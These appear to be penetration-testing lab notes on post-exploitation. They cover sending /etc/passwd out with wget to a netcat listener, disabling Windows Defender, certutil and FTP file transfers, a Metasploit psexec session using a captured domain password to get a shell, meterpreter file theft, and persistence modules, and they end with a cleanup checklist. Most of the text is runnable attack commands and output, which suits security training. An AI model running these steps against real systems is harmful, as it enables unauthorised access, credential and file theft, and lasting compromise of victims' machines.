We can post or send file contents from one machine to another using 'wget':

We set up a netcat listener at our kali machine:
$ nc -nvlp 8081

On the other linux/windows machine, we can send the contents of anyfile to Kali
$ wget --post-file=/etc/passwd [IP Of Kali]

---------------------------

We can turn off Windows Defender permanently on the Win 10 machines by going to "gpedit" > Administrative Tools >
Windows Components > Windows Defender Antivirus > Look for the policy to turn it off, and Enable it.
---------------------------

We will use certutil for file transfers now, on Win 10.
$ certutil -urlcache -f http://[kali ip]/file.txt file.txt

Using FTP:

In Kali
$ pip install pyftpdlib
$ python -m pyftpdlib -p 21

In Windows:

> ftp [kali ip]
> user: anonymous
> pass: anonymous
Connected.
----------------------------
Using msfconsole
msf > use exploit/windows/smb/psexec
msf5 exploit(windows/smb/psexec) > set rhosts 192.168.100.61
rhosts => 192.168.100.61
msf5 exploit(windows/smb/psexec) > set smbdomain marvel
smbdomain => marvel
msf5 exploit(windows/smb/psexec) > set smbpass Kawaninjazx6r
smbpass => Kawaninjazx6r
msf5 exploit(windows/smb/psexec) > set smbuser fcastle
smbuser => fcastle
msf5 exploit(windows/smb/psexec) > set target 2
msf > run

That will return a shell to that system.

meterpreter > upload secrets.txt c:\\ -> That will upload the secrets.txt file to C: Drive in Windows.

Also we can download from Win to our Kali machine:
meterpreter > download c:\\secrets.txt secrets.txt
[*] Downloading: c:\secrets.txt -> secrets.txt
[*] Downloaded 9.00 B of 9.00 B (100.0%): c:\secrets.txt -> secrets.txt
[*] download   : c:\secrets.txt -> secrets.txt


-----------------------------
Maintaining Access w/ Meterpreter
Persistence Scripts
meterpreter > run persistence -h -> Really dangerous module to run.
msf > exploit/windows/local/persistence
msf > exploit/windows/local/registry_persistence
Scheduled Tasks
msf > run scheduleme
msf > run schtaskabuse
Metsvc
msf > run metsvc -A

From here, starts the Lab, please refer to "Pivoting_Lab" for instructions.

CLEANUP

1- Remove all executable, scripts and temporary files from a compromised system. If possible use secure delete method for removing the files and folders
2- Return to original values system settings and application configuration parameters if they were modified during the assessment
3- Remove all backdoors and/or rootkits installed
4- Remove any user accounts created for connecting back to compromise systems
